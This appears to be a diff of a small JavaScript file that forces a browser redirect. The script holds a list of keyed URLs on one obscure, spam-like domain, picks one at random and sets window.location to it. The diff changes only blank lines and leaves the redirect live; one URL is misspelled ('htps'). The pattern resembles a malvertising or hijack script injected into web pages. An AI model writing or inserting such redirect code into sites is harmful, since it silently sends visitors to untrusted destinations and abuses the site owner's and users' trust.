@@ -16,14 +16,8 @@ var dataUrl = [
   'https://amendablepredicamentvertical.com/uhr5mmahw?key=e6341416b270ee9a62e0996299d61fa1',
   'htps://amendablepredicamentvertical.com/nymnme7td?key=79b78598c8b159605c550bf724e60855'
   
-  
- 
-
-  
-  
-  
-
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
+
 
